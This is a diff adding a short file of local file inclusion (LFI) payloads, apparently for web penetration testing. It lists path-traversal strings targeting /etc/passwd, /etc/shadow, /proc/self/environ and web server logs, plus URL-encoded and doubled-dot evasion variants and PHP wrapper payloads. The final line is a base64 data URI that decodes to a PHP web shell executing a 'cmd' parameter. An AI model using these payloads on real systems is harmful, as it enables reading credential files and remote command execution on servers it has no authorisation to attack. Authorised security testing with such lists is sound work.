@@ -1,0 +1,17 @@
+# LFI Payloads
+../../../etc/passwd
+../../../etc/shadow
+../../../etc/hosts
+../../../proc/self/environ
+../../../var/log/apache2/access.log
+../../../var/log/nginx/access.log
+....//....//....//etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/proc/self/environ
+php://filter/convert.base64-encode/resource=index.php
+php://input
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
